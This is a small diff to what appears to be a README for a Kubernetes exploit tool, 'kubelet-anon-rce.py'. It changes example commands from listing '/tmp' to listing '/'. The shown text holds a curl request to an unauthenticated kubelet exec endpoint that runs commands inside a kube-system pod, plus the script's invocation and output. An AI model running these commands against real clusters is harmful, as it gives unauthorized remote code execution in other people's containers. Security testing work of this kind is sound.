@@ -114,7 +114,7 @@ Target `{namespace}`, `{pod}` and `{container}` values can be obtained from the 
 ```
 $ curl -Gks https://worker:10250/exec/kube-system/tiller-797d1b1234-gb6qt/tiller \
   -d 'input=1' -d 'output=1' -d 'tty=1'                                            \
-  -d 'command=ls' -d 'command=/tmp'
+  -d 'command=ls' -d 'command=/'
 
 <a href="/cri/exec/CLgtq03G">Found</a>.
 ```
@@ -129,7 +129,7 @@ $ python3 kubelet-anon-rce.py           \
           --namespace kube-system       \
           --pod tiller-797d1b1234-gb6qt \
           --container tiller            \
-          --exec "ls /tmp"
+          --exec "ls /"
 
 bin  etc   lib	  mnt  proc  run   selinux  sys  usr
 dev  home  lib64  opt  root  sbin  srv	    tmp  var
